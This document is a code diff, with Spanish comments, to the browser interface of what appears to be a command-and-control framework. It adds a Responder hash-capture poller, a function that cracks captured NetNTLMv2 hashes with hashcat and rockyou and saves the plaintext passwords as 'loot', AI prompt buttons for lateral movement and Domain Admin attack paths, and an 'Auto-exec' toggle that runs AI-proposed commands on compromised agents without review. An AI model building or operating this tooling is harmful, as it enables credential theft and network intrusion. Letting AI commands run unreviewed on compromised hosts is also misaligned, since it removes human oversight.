@@ -683,6 +683,10 @@ input[type=checkbox]{accent-color:var(--accent);cursor:pointer}
               <option value="claude-haiku-4-5-20251001">Haiku 4.5</option>
             </select>
             <span id="aic-cc-status" style="display:none;font-size:10px;font-family:var(--font-mono);color:#5af78e">⚡ OAuth activo</span>
+            <label style="display:flex;align-items:center;gap:3px;font-size:10px;font-family:var(--font-mono);color:var(--text3);cursor:pointer;border-left:1px solid var(--border);padding-left:8px;margin-left:2px" title="Ejecutar automáticamente comandos c2 propuestos por la IA">
+              <input type="checkbox" id="aic-autoexec" style="width:11px;height:11px;cursor:pointer;accent-color:var(--accent)">
+              Auto-exec
+            </label>
           </div>
           <div id="aic-messages"></div>
           <div id="aic-chips">
@@ -2084,7 +2088,7 @@ input[type=checkbox]{accent-color:var(--accent);cursor:pointer}
                         <th style="text-align:left;padding:4px 6px;font-weight:500">Domain</th>
                         <th style="text-align:left;padding:4px 6px;font-weight:500">IP</th>
                         <th style="text-align:left;padding:4px 6px;font-weight:500;max-width:180px">Hash</th>
-                        <th style="text-align:left;padding:4px 6px;font-weight:500">Action</th>
+                        <th style="text-align:left;padding:4px 6px;font-weight:500">Actions</th>
                       </tr>
                     </thead>
                     <tbody id="resp-hashes-tbody">
@@ -2254,6 +2258,14 @@ input[type=checkbox]{accent-color:var(--accent);cursor:pointer}
             <strong>🤖 AI Assistant</strong><br>
             <span style="font-size:12px;color:var(--text2)">Conectado a Ollama · Selecciona un modelo y empieza a chatear.<br>Usa <strong>⊕ Contexto C2</strong> para inyectar el estado actual de los agentes.</span>
           </div>
+        </div>
+        <div id="ai-global-chips" style="display:flex;overflow-x:auto;gap:6px;padding:6px 14px;border-top:1px solid var(--border);background:var(--bg3);flex-shrink:0;scrollbar-width:thin">
+          <button class="aic-chip" onclick="aiGlobalChip('all-agents')">All Agents Status</button>
+          <button class="aic-chip" onclick="aiGlobalChip('lateral-paths')">Lateral Move Paths</button>
+          <button class="aic-chip" onclick="aiGlobalChip('cred-mapping')">Cred → Host Mapping</button>
+          <button class="aic-chip" onclick="aiGlobalChip('attack-path')">Best Attack Path</button>
+          <button class="aic-chip" onclick="aiGlobalChip('domain-admin')">Domain Admin Path</button>
+          <button class="aic-chip" onclick="aiGlobalChip('opsec-review')">OPSEC Review</button>
         </div>
         <div id="ai-input-bar">
           <textarea id="ai-input" rows="2" placeholder="Escribe un mensaje… (Enter para enviar, Shift+Enter para nueva línea)"></textarea>
@@ -16274,6 +16286,24 @@ function aiClearChat() {
   );
 }
 
+const _AI_GLOBAL_CHIPS = {
+  'all-agents':    'Give me a full status summary of all connected agents: hostname, user, admin status, OS, transport, and last-seen time.',
+  'lateral-paths': 'Based on the current agents and credentials vault, identify all viable lateral movement paths. Which machines can we reach with existing credentials?',
+  'cred-mapping':  'Map each credential in the vault to the hosts where it likely works. Suggest which targets to try with each credential.',
+  'attack-path':   'What is the best attack path to get Domain Admin from our current position? Use all available agents, creds, and BloodHound data.',
+  'domain-admin':  'Trace the shortest path to NT AUTHORITY\\SYSTEM or Domain Admin from each active agent. What is missing?',
+  'opsec-review':  'Review our current operational security posture: noisy commands, persistence artifacts, exposed indicators, and what defenders could see right now.',
+};
+function aiGlobalChip(key) {
+  const q = _AI_GLOBAL_CHIPS[key];
+  if (!q) return;
+  const el = document.getElementById('ai-input');
+  if (!el) return;
+  el.value = q;
+  el.dispatchEvent(new Event('input'));
+  el.focus();
+}
+
 async function aiInjectContext() {
   // Build a context snapshot of the current C2 state
   let ctx = '## Estado actual del C2\n\n';
@@ -16557,6 +16587,13 @@ function _aicInit(agentId) {
   if (!a) return;
   aicAgentId = agentId;
   const sess = aicSessions[agentId] || (aicSessions[agentId] = { frag: null, history: [], cmdIdx: 0 });
+  // Restore history from localStorage if in-memory session is empty
+  if (sess.history.length === 0) {
+    try {
+      const saved = localStorage.getItem('aic_hist_' + agentId);
+      if (saved) sess.history = JSON.parse(saved);
+    } catch(_) {}
+  }
   aicHistory = sess.history;
   _aicCmdIdx = sess.cmdIdx;
   aicBusy = false;
@@ -16957,6 +16994,13 @@ async function aicSend() {
     if (aicAgentId && aicSessions[aicAgentId]) {
       aicSessions[aicAgentId].history = [...aicHistory];
       aicSessions[aicAgentId].cmdIdx = _aicCmdIdx;
+      // Persist last 60 messages to localStorage so history survives page reload
+      try { localStorage.setItem('aic_hist_' + aicAgentId, JSON.stringify(aicHistory.slice(-60))); } catch(_) {}
+    }
+    // Auto-exec: if toggle is on, click the latest pending exec button
+    if (document.getElementById('aic-autoexec')?.checked) {
+      const pending = [...document.querySelectorAll('[id^="aic-execbtn-"]')].filter(b => !b.disabled);
+      if (pending.length > 0) pending[pending.length - 1].click();
     }
   }
 }
@@ -18172,6 +18216,7 @@ async function ipcRun(action) {
 
 // ── Responder integration ─────────────────────────────────────────────────────
 let _respAbort = null;
+let _respPollTimer = null;
 const _respHashes = []; // [{username,domain,ip,hash,captured_at}]
 
 async function respLoadIfaces() {
@@ -18222,6 +18267,8 @@ async function respStart() {
   document.getElementById('resp-btn-stop').style.display  = '';
   if (_respAbort) _respAbort.abort();
   _respAbort = new AbortController();
+  if (_respPollTimer) clearInterval(_respPollTimer);
+  _respPollTimer = setInterval(respRefreshHashes, 10000);
   const tok = TOKEN || window.__GUI_TOKEN__ || '';
   try {
     const resp = await fetch('/exec', {
@@ -18252,11 +18299,13 @@ async function respStart() {
   document.getElementById('resp-btn-start').style.display = '';
   document.getElementById('resp-btn-stop').style.display  = 'none';
   _respAbort = null;
+  if (_respPollTimer) { clearInterval(_respPollTimer); _respPollTimer = null; }
   respRefreshHashes();
 }
 
 function respStop() {
   if (_respAbort) { _respAbort.abort(); _respAbort = null; }
+  if (_respPollTimer) { clearInterval(_respPollTimer); _respPollTimer = null; }
   _execOneshot('sudo pkill -x Responder 2>/dev/null; true').catch(()=>{});
   document.getElementById('resp-btn-start').style.display = '';
   document.getElementById('resp-btn-stop').style.display  = 'none';
@@ -18292,7 +18341,10 @@ function respRenderHashes() {
       <td style="padding:4px 6px">${_escHtml(h.domain)}</td>
       <td style="padding:4px 6px">${_escHtml(h.ip)}</td>
       <td style="padding:4px 6px;max-width:180px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" title="${_escHtml(h.hash)}">${_escHtml(h.hash.slice(0,40))}…</td>
-      <td style="padding:4px 6px"><button class="btn btn-ghost btn-sm" onclick="respSaveLoot(${i})">→ Loot</button></td>
+      <td style="padding:4px 6px;white-space:nowrap">
+        <button class="btn btn-ghost btn-sm" onclick="respSaveLoot(${i})">→ Loot</button>
+        <button class="btn btn-ghost btn-sm" id="resp-crack-${i}" onclick="respCrack(${i})" style="margin-left:4px" title="Crack con hashcat + rockyou">🔓</button>
+      </td>
     </tr>`).join('');
 }
 
@@ -18316,6 +18368,45 @@ async function respImportAll() {
   let ok = 0;
   for (let i = 0; i < _respHashes.length; i++) await respSaveLoot(i).then(()=>ok++).catch(()=>{});
   toast(`Imported ${ok} hash(es) to Loot`, 'success');
+}
+
+async function respCrack(idx) {
+  const h = _respHashes[idx];
+  if (!h) return;
+  const btn = document.getElementById('resp-crack-' + idx);
+  if (btn) { btn.disabled = true; btn.textContent = '⏳'; }
+  const wordlist = '/usr/share/wordlists/rockyou.txt';
+  // Write hash to a tmpfile and run hashcat -m 5600 (NetNTLMv2)
+  const tmpFile = `/tmp/_resp_hash_${idx}.txt`;
+  const cmd = `echo '${h.hash.replace(/'/g, "'\\''")}' > ${tmpFile} && hashcat -m 5600 -a 0 --quiet --potfile-disable ${tmpFile} ${wordlist} 2>/dev/null; hashcat -m 5600 --quiet --show ${tmpFile} 2>/dev/null; rm -f ${tmpFile}`;
+  const outEl = document.getElementById('resp-output');
+  if (outEl) outEl.innerHTML += `\n<span style="color:var(--accent)">[crack] Starting hashcat for ${_escHtml(h.username)}…</span>\n`;
+  try {
+    const result = await _execOneshot(cmd);
+    const lines = result.trim().split('\n').filter(Boolean);
+    // hashcat --show output: hash:password
+    const cracked = lines.find(l => l.includes(':') && !l.startsWith('['));
+    if (cracked) {
+      const parts = cracked.split(':');
+      const password = parts[parts.length - 1];
+      if (outEl) outEl.innerHTML += `<span style="color:#5af78e">[+] Cracked: ${_escHtml(h.username)} → ${_escHtml(password)}</span>\n`;
+      // Auto-save plaintext cred to Loot
+      const tok = TOKEN || window.__GUI_TOKEN__ || '';
+      await fetch('/api/creds', {
+        method: 'POST',
+        headers: {'Content-Type':'application/json','Authorization':'Bearer '+tok},
+        body: JSON.stringify({type:'Plaintext', domain:h.domain, username:h.username, secret:password, host:h.ip, source:'Responder+hashcat'}),
+      });
+      toast(`Cracked ${h.domain}\\${h.username} → ${password} (saved to Loot)`, 'success');
+    } else {
+      if (outEl) outEl.innerHTML += `<span style="color:var(--text3)">[crack] No match found for ${_escHtml(h.username)}</span>\n`;
+      toast(`No match found for ${h.username}`, 'error');
+    }
+  } catch(e) {
+    toast('Crack error: ' + e.message, 'error');
+  }
+  if (btn) { btn.disabled = false; btn.textContent = '🔓'; }
+  if (outEl) outEl.scrollTop = outEl.scrollHeight;
 }
 
 async function ibuildAndDeploy() {
